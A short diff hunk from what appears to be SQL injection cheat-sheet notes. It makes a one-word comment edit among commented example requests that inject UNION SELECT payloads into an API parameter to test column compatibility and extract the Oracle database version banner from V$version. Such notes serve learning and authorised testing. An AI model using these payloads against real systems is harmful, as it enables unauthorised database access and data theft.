@@ -352,7 +352,7 @@ select FROM
 -- GET/api/path=here'UNION+SELECT+NULL,NULL+FROM+DUAL--
 -- GET/api/path=here'UNION+SELECT+'test','test'+FROM+DUAL--
 -- GET/api/path=here'UNION+SELECT+BANNER,NULL+FROM+V$version--
------- If all null test pass as compatible with string, only 1 is needed 
+------ If all NULL test pass as compatible with string, only 1 is needed 
 to pull down the db Banner
 ------ V$version table is specific to Oracle db
 ---- MySQL
